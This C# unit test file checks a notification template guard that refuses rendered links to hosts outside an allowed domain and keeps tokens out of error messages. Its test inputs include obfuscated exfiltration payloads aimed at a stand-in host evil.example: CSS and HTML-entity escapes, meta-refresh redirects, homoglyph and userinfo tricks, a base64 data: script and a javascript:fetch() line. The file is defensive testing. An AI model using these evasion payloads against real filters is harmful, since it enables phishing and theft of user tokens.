using NotificationHub.Api.Modules.TemplateManagement.Domain;
using NotificationHub.Api.Modules.TemplateManagement.Integration.V1;
using NotificationHub.SharedKernel;

namespace NotificationHub.UnitTests.TemplateManagement;

public sealed class RenderedDestinationPolicyTests
{
    [Theory]
    [InlineData("""<a href="hTtPs://evil.example.io/pay?token=tok_personal_123&amp;cpf=123.456.789-09">ir</a>""")]
    [InlineData("""<img src="HTTPS&#58;//evil.example.io/pixel?token=tok_personal_123&amp;cpf=123.456.789-09">""")]
    public void A_foreign_markup_destination_is_refused_without_disclosing_its_value(string body)
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            body,
            bodyText: null);

        result.IsFailure.ShouldBeTrue();
        result.ErrorKind.ShouldBe(ResultErrorKind.Validation);
        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
        error.Detail.ShouldContain("evil.example.io");
        error.Detail.ShouldNotContain("token=");
        error.Detail.ShouldNotContain("tok_personal_123");
        error.Detail.ShouldNotContain("123.456.789-09");
    }

    [Theory]
    [InlineData("subject")]
    [InlineData("body")]
    [InlineData("bodyText")]
    public void A_foreign_text_destination_is_refused_in_every_rendered_field(string field)
    {
        const string ForeignUrl = "HTTPS://evil.example.io/action";
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Push,
            field == "subject" ? ForeignUrl : null,
            field == "body" ? ForeignUrl : "Mensagem",
            field == "bodyText" ? ForeignUrl : null);

        result.IsFailure.ShouldBeTrue();
        DomainError.Describe(result.Error, result.ErrorKind).Detail.ShouldContain($"'{field}'");
    }

    [Fact]
    public void A_mixed_case_destination_in_an_allowed_subdomain_is_accepted()
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: "Atualização",
            body: """<a href="HtTpS://assets.montebravo.com.br/documento">abrir</a>""",
            bodyText: "Acesse HTTPS://assets.montebravo.com.br/documento");

        result.IsSuccess.ShouldBeTrue(result.Error);
    }

    [Theory]
    [InlineData("""<a href="https://[2001:db8::1]/pay?token=tok_personal_123">abrir</a>""", "2001:db8::1")]
    [InlineData("""<a href="https://аpple.com/pay?token=tok_personal_123">abrir</a>""", "xn--pple-43d.com")]
    public void A_non_domain_or_unicode_destination_is_refused_by_its_canonical_host(
        string body,
        string expectedHost)
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            body,
            bodyText: null);

        result.IsFailure.ShouldBeTrue();
        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
        error.Detail.ShouldContain(expectedHost);
        error.Detail.ShouldNotContain("https://");
        error.Detail.ShouldNotContain("token=");
        error.Detail.ShouldNotContain("tok_personal_123");
    }

    [Theory]
    [InlineData("""<div style="background:url(\68 \74 \74 \70 \73 \3a \2f \2f \65 vil\2e example\2e io/pay?token=tok_personal_123)"></div>""")]
    [InlineData("""<div style="background:url('https\:\/\/evil\.example\.io/pay?token=tok_personal_123')"></div>""")]
    [InlineData("""<div style="background:url(&quot;\68 ttps\3a \2f \2f evil\2e example\2e io/pay?token=tok_personal_123&quot;)"></div>""")]
    public void A_css_url_with_an_escaped_foreign_host_is_refused(string body)
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            body,
            bodyText: null);

        result.IsFailure.ShouldBeTrue();
        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
        error.Detail.ShouldContain("evil.example.io");
        error.Detail.ShouldNotContain("token=");
        error.Detail.ShouldNotContain("tok_personal_123");
    }

    [Theory]
    [InlineData("""<div style="background:url(\68 \74 \74 \70 \73 \3a \2f \2f assets\2e montebravo\2e com\2e br/logo.png)"></div>""")]
    [InlineData("""<div style="background:url('https\:\/\/assets\.montebravo\.com\.br/logo.png')"></div>""")]
    [InlineData("""<div style="background:url(&quot;https://assets\2e montebravo\2e com\2e br/logo.png&quot;)"></div>""")]
    public void A_css_url_with_an_escaped_allowed_host_is_accepted(string body)
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            body,
            bodyText: null);

        result.IsSuccess.ShouldBeTrue(result.Error);
    }

    [Theory]
    [InlineData("""<div style="background:\75\72\6c(\68\74\74\70\73\3a\2f\2f\65 vil\2e example\2e io/pay?token=tok_personal_123)"></div>""")]
    [InlineData("""<style>/**/u\72 l(\68\74\74\70\73\3a\2f\2f\65 vil\2e example\2e io/pay?token=tok_personal_123)</style>""")]
    public void A_css_function_with_an_escaped_url_identifier_enforces_the_foreign_host(string body)
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            body,
            bodyText: null);

        result.IsFailure.ShouldBeTrue();
        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
        error.Detail.ShouldContain("evil.example.io");
        error.Detail.ShouldNotContain("tok_personal_123");
    }

    [Fact]
    public void A_css_function_with_an_escaped_url_identifier_accepts_an_allowed_host()
    {
        const string Body =
            """<div style="background:\u\r\l('https\:\/\/assets\.montebravo\.com\.br/logo.png')"></div>""";

        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            Body,
            bodyText: null);

        result.IsSuccess.ShouldBeTrue(result.Error);
    }

    [Theory]
    [InlineData("""<div style="background:my\75\72\6c(\68\74\74\70\73\3a\2f\2f\65 vil\2e example\2e io)"></div>""")]
    [InlineData("""<div style="background:\u\r\l (\68\74\74\70\73\3a\2f\2f\65 vil\2e example\2e io)"></div>""")]
    [InlineData("""<div style="background:\u\r\l/**/(\68\74\74\70\73\3a\2f\2f\65 vil\2e example\2e io)"></div>""")]
    [InlineData("""<style>/* \75\72\6c(\68\74\74\70\73\3a\2f\2f\65 vil\2e example\2e io) */</style>""")]
    public void Css_identifier_boundaries_whitespace_and_comments_do_not_create_a_url_function(string body)
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            body,
            bodyText: null);

        result.IsSuccess.ShouldBeTrue(result.Error);
    }

    [Theory]
    [InlineData("""<a href="https&colon;&sol;&sol;evil&period;example&period;io/pay?token=tok_personal_123&amp;cpf=123.456.789-09">abrir</a>""")]
    [InlineData("""<img src='https&colon;&sol;&sol;evil&period;example&period;io/pixel?token=tok_personal_123&amp;cpf=123.456.789-09'>""")]
    [InlineData("""<div style="background:url(https&colon;&sol;&sol;evil&period;example&period;io/pay?token=tok_personal_123&amp;cpf=123.456.789-09)"></div>""")]
    public void Html5_named_references_in_a_destination_do_not_hide_a_foreign_host(string body)
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            body,
            bodyText: null);

        result.IsFailure.ShouldBeTrue();
        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
        error.Detail.ShouldContain("evil.example.io");
        error.Detail.ShouldNotContain("tok_personal_123");
        error.Detail.ShouldNotContain("123.456.789-09");
    }

    [Theory]
    [InlineData("""<a href="https&colon;&sol;&sol;assets&period;montebravo&period;com&period;br/logo.png">abrir</a>""")]
    [InlineData("""<img src='https&colon;&sol;&sol;assets&period;montebravo&period;com&period;br/pixel'>""")]
    [InlineData("""<div style="background:url(https&colon;&sol;&sol;assets&period;montebravo&period;com&period;br/logo.png)"></div>""")]
    public void Html5_named_references_in_a_destination_preserve_an_allowed_host(string body)
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            body,
            bodyText: null);

        result.IsSuccess.ShouldBeTrue(result.Error);
    }

    [Fact]
    public void An_unresolved_named_reference_in_a_destination_fails_closed_without_disclosure()
    {
        const string Body =
            """<a href="https&colon;&sol;&sol;&notARealReference;tok_personal_123&period;example&period;io/pay">abrir</a>""";

        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            Body,
            bodyText: null);

        result.IsFailure.ShouldBeTrue();
        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
        error.Detail.ShouldContain(LinkDomainPolicy.UnresolvedHost);
        error.Detail.ShouldNotContain("notARealReference");
        error.Detail.ShouldNotContain("tok_personal_123");
        error.Detail.ShouldNotContain("example.io");
    }

    [Theory]
    [InlineData("""<p>https&colon;&sol;&sol;evil&period;example&period;io é texto comum.</p>""")]
    [InlineData("""<a href="https&amp;colon;&amp;sol;&amp;sol;evil&amp;period;example&amp;period;io">texto</a>""")]
    public void Named_reference_normalization_is_limited_to_one_pass_inside_destinations(string body)
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            body,
            bodyText: null);

        result.IsSuccess.ShouldBeTrue(result.Error);
    }

    [Theory]
    [InlineData("""<meta http-equiv="refresh" content="0; url=https&colon;&sol;&sol;evil&period;example&period;io/pay?token=tok_personal_123&amp;cpf=123.456.789-09">""", "evil.example.io")]
    [InlineData("""<META CONTENT='5;URL=HTTPS&colon;&sol;&sol;evil&period;example&period;io/pay?token=tok_personal_123&amp;cpf=123.456.789-09' HTTP-EQUIV='ReFrEsH'>""", "evil.example.io")]
    [InlineData("""<meta content=0;url=https&colon;&sol;&sol;evil&period;example&period;io/pay?token=tok_personal_123&amp;cpf=123.456.789-09 http-equiv=refresh>""", "evil.example.io")]
    [InlineData("""<meta http-equiv=refresh content="0;url=https&colon;&sol;&sol;аpple&period;com/pay?token=tok_personal_123">""", "xn--pple-43d.com")]
    public void A_meta_refresh_destination_is_refused_by_its_canonical_foreign_host(
        string body,
        string expectedHost)
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            body,
            bodyText: null);

        result.IsFailure.ShouldBeTrue();
        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
        error.Detail.ShouldContain(expectedHost);
        error.Detail.ShouldNotContain("tok_personal_123");
        error.Detail.ShouldNotContain("123.456.789-09");
    }

    [Theory]
    [InlineData("""<meta http-equiv="refresh" content="0; url=https&colon;&sol;&sol;assets&period;montebravo&period;com&period;br/logo.png">""")]
    [InlineData("""<META CONTENT='5;URL=HTTPS&colon;&sol;&sol;assets&period;montebravo&period;com&period;br/logo.png' HTTP-EQUIV='ReFrEsH'>""")]
    [InlineData("""<meta content=0;url=https&colon;&sol;&sol;assets&period;montebravo&period;com&period;br/logo.png http-equiv=refresh>""")]
    public void A_meta_refresh_destination_accepts_an_allowed_host(string body)
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            body,
            bodyText: null);

        result.IsSuccess.ShouldBeTrue(result.Error);
    }

    [Theory]
    [InlineData("""<meta http-equiv=refresh content="5; token=tok_personal_123.example.io">""")]
    [InlineData("""<meta http-equiv=refresh content="0;url=https&colon;&sol;&sol;&notARealReference;tok_personal_123&period;example&period;io/pay">""")]
    public void An_illegible_meta_refresh_fails_closed_without_disclosing_content(string body)
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            body,
            bodyText: null);

        result.IsFailure.ShouldBeTrue();
        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
        error.Detail.ShouldContain(LinkDomainPolicy.UnresolvedHost);
        error.Detail.ShouldNotContain("tok_personal_123");
        error.Detail.ShouldNotContain("example.io");
        error.Detail.ShouldNotContain("notARealReference");
    }

    [Fact]
    public void Meta_refresh_userinfo_is_never_disclosed()
    {
        const string Body =
            """<meta http-equiv=refresh content="0;url=https&colon;&sol;&sol;tok_personal_123&period;example&period;io@assets&period;montebravo&period;com&period;br/pay?cpf=123.456.789-09">""";

        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            Body,
            bodyText: null);

        result.IsFailure.ShouldBeTrue();
        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
        error.Detail.ShouldContain(LinkDomainPolicy.UnresolvedHost);
        error.Detail.ShouldNotContain("tok_personal_123");
        error.Detail.ShouldNotContain("example.io");
        error.Detail.ShouldNotContain("123.456.789-09");
    }

    [Theory]
    [InlineData("""<meta name="description" content="0;url=https&colon;&sol;&sol;evil&period;example&period;io">""")]
    [InlineData("""<meta http-equiv="content-type" content="0;url=https&colon;&sol;&sol;evil&period;example&period;io">""")]
    public void A_non_refresh_meta_content_is_not_a_link_destination(string body)
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            body,
            bodyText: null);

        result.IsSuccess.ShouldBeTrue(result.Error);
    }

    [Theory]
    [InlineData("""<svg><use style="fill:url(#logo)"></use></svg>""")]
    [InlineData("""<div style="background:url(data:image/png;base64,AAAA)"></div>""")]
    [InlineData("""<p>O texto \68 \74 \74 \70 \73 \3a \2f \2f evil\2e example\2e io não é CSS.</p>""")]
    public void Innocuous_css_and_escaped_plain_text_are_not_link_destinations(string body)
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            body,
            bodyText: null);

        result.IsSuccess.ShouldBeTrue(result.Error);
    }

    [Fact]
    public void A_malformed_css_url_fails_closed_without_disclosing_its_input()
    {
        const string Body =
            """<div style="background:url(\68 \74 \74 \70 \73 \3a \2f \2f {tok_personal_123.example.io)"></div>""";

        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            Body,
            bodyText: null);

        result.IsFailure.ShouldBeTrue();
        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
        error.Detail.ShouldContain(LinkDomainPolicy.UnresolvedHost);
        error.Detail.ShouldNotContain("tok_personal_123");
        error.Detail.ShouldNotContain("example.io");
    }

    [Fact]
    public void An_invalid_authority_fails_closed_without_disclosing_its_input()
    {
        const string Body = """<a href="https://{tok_personal_123.example.io}/pay">abrir</a>""";

        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            Body,
            bodyText: null);

        result.IsFailure.ShouldBeTrue();
        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
        error.Detail.ShouldContain(LinkDomainPolicy.UnresolvedHost);
        error.Detail.ShouldNotContain("tok_personal_123");
        error.Detail.ShouldNotContain("example.io");
    }

    [Fact]
    public void A_host_like_userinfo_fails_closed_without_disclosing_the_userinfo()
    {
        const string Body =
            """<a href="https://tok_personal_123.example.io@assets.montebravo.com.br/pay">abrir</a>""";

        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            Body,
            bodyText: null);

        result.IsFailure.ShouldBeTrue();
        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
        error.Detail.ShouldContain(LinkDomainPolicy.UnresolvedHost);
        error.Detail.ShouldNotContain("tok_personal_123");
        error.Detail.ShouldNotContain("example.io");
    }

    [Fact]
    public void Brazilian_document_and_invoice_numbers_remain_plain_text()
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Push,
            subject: "Nota fiscal 1.234/56",
            body: "CNPJ 12.345.678/0001-90, Cláusula 3.1/b.",
            bodyText: null);

        result.IsSuccess.ShouldBeTrue(result.Error);
    }

    /// <summary>
    /// The rendered form is refused for the spelling a client resolves, not
    /// only for the one an author would write. Each of these reaches
    /// evil.example, in text and in markup, on the render path and on the
    /// publication path alike.
    /// </summary>
    [Theory]
    [InlineData("""Acesse https:\\evil.example/pagar para concluir.""")]
    [InlineData("""Acesse https:/\evil.example/pagar para concluir.""")]
    [InlineData("""Acesse https:evil.example/pagar para concluir.""")]
    [InlineData("""Acesse https:/evil.example/pagar para concluir.""")]
    [InlineData("""Acesse \\evil.example/pagar para concluir.""")]
    public void A_scheme_separated_from_its_authority_by_anything_is_still_refused(string body)
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Push,
            subject: null,
            body,
            bodyText: null);

        result.IsFailure.ShouldBeTrue();
        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
        error.Detail.ShouldContain("evil.example");
    }

    /// <summary>
    /// A separator a client removes before resolving the URL does not truncate
    /// the authority the guard reads, and the value it carried never becomes
    /// the detail of the refusal.
    /// </summary>
    [Theory]
    [InlineData("""<a href="https://assets.montebravo.com.br&#9;@evil&#9;.example?token=tok_personal_123">ir</a>""")]
    [InlineData("""<a href="https://assets.montebravo.com.br&#10;@evil&#10;.example?token=tok_personal_123">ir</a>""")]
    [InlineData("""<a href="https://assets.montebravo.com.br&#13;@evil&#13;.example?token=tok_personal_123">ir</a>""")]
    [InlineData("""<a href="https://assets.montebravo.com.br&#x09;@evil&#x09;.example?token=tok_personal_123">ir</a>""")]
    [InlineData("""<img src="https://assets.montebravo.com.br&#9;@evil&#9;.example?token=tok_personal_123">""")]
    [InlineData("""<form action="https://assets.montebravo.com.br&#9;@evil&#9;.example?token=tok_personal_123"></form>""")]
    public void A_truncating_separator_is_refused_without_disclosing_its_value(string body)
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            body,
            bodyText: null);

        result.IsFailure.ShouldBeTrue();
        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
        error.Detail.ShouldContain("evil.example");
        error.Detail.ShouldNotContain("token=");
        error.Detail.ShouldNotContain("tok_personal_123");
    }

    [Fact]
    public void A_truncating_separator_does_not_hide_a_foreign_subdomain()
    {
        const string Body =
            """<a href="https://assets.montebravo.com.br&#9;.evil&#9;.example/pagar">ir</a>""";

        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            Body,
            bodyText: null);

        result.IsFailure.ShouldBeTrue();
        DomainError.Describe(result.Error, result.ErrorKind).Detail
            .ShouldContain("assets.montebravo.com.br.evil.example");
    }

    /// <summary>
    /// A destination that carries its payload instead of naming a place is
    /// refused, and the refusal says only the fixed marker: the value is
    /// attacker-supplied and may encode anything at all.
    /// </summary>
    [Theory]
    [InlineData("""<a href="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly9ldmlsLmV4YW1wbGUuaW8vP3Q9dG9rX3BlcnNvbmFsXzEyMycpPC9zY3JpcHQ+">ir</a>""")]
    [InlineData("""<a href="blob:https://assets.montebravo.com.br/tok_personal_123">ir</a>""")]
    [InlineData("""<a href="d&#9;ata:text/html;base64,dG9rX3BlcnNvbmFsXzEyMw==">ir</a>""")]
    public void A_destination_with_a_scheme_this_catalog_does_not_deliver_is_refused(string body)
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            body,
            bodyText: null);

        result.IsFailure.ShouldBeTrue();
        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
        error.Detail.ShouldContain(LinkDomainPolicy.UnresolvedHost);
        error.Detail.ShouldNotContain("tok_personal_123");
        error.Detail.ShouldNotContain("example.io");
    }

    /// <summary>
    /// The guard refuses on the authority a client resolves, whatever character
    /// the author put in the middle of it, and still says only the host.
    /// </summary>
    [Theory]
    [InlineData("&quot;")]
    [InlineData("&#34;")]
    [InlineData("&apos;")]
    [InlineData("&#39;")]
    [InlineData("&lt;")]
    [InlineData("&gt;")]
    [InlineData("&nbsp;")]
    [InlineData("&#160;")]
    [InlineData("&#8201;")]
    [InlineData("&#12288;")]
    public void A_separator_the_candidate_cannot_carry_is_refused_without_disclosing_its_value(string planted)
    {
        var body =
            $"""<a href="https://assets.montebravo.com.br{planted}@evil.example?token=tok_personal_123">ir</a>""";

        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            body,
            bodyText: null);

        result.IsFailure.ShouldBeTrue();
        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
        error.Detail.ShouldContain("evil.example");
        error.Detail.ShouldNotContain("token=");
        error.Detail.ShouldNotContain("tok_personal_123");
    }

    /// <summary>
    /// A refused scheme names the host it carried, so the author can act on the
    /// refusal, and still discloses nothing else about the value.
    /// </summary>
    [Theory]
    [InlineData("""<a href="blob:https://evil.example/tok_personal_123">ir</a>""")]
    [InlineData("""<a href="javascript:fetch('https://evil.example/?t=tok_personal_123')">ir</a>""")]
    public void A_refused_scheme_names_its_host_without_disclosing_the_value(string body)
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            body,
            bodyText: null);

        result.IsFailure.ShouldBeTrue();
        DomainErrorInfo error = DomainError.Describe(result.Error, result.ErrorKind);
        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
        error.Detail.ShouldContain("evil.example");
        error.Detail.ShouldNotContain("tok_personal_123");
    }

    /// <summary>
    /// A template that already publishes with a doubled slash in a path keeps
    /// rendering. The guard decides the rendered result, so a false host read
    /// out of a path is not a refused publication, it is an outage.
    /// </summary>
    [Theory]
    [InlineData("""<img src="https://assets.montebravo.com.br//imagens/logo.png">""")]
    [InlineData("""<a href="https://assets.montebravo.com.br//pt-br/faturas/2026">abrir</a>""")]
    [InlineData("""<img src="https://assets.montebravo.com.br/t//open.gif?id=abc">""")]
    public void A_doubled_slash_inside_a_path_still_renders(string body)
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Email,
            subject: null,
            body,
            bodyText: null);

        result.IsSuccess.ShouldBeTrue(result.Error);
    }

    [Fact]
    public void A_note_about_configuration_still_renders()
    {
        Result result = RenderedDestinationPolicy.Validate(
            MakeTemplate(),
            Channel.Push,
            subject: "Integração atualizada",
            body: "O parceiro retornou codigo HTTP:200 e o campo https:true no contrato.",
            bodyText: """Erro HTTP:404 tratado; compartilhamento \\fileserver\notas.""");

        result.IsSuccess.ShouldBeTrue(result.Error);
    }

    private static Template MakeTemplate()
        => Template.Create(TemplateKey.Create("orders.status.changed").Value!, new TemplateMetadata
        {
            Application = "araia-cambio",
            Class = NotificationClass.Transactional,
            OwnerTeam = "growth-squad",
            Purpose = "order-updates",
            LegalBasis = "execucao-de-contrato",
            DefaultLocale = Locale.Create("pt-BR").Value,
            LinkDomainsAllowed = ["montebravo.com.br"],
        }).Value!;
}
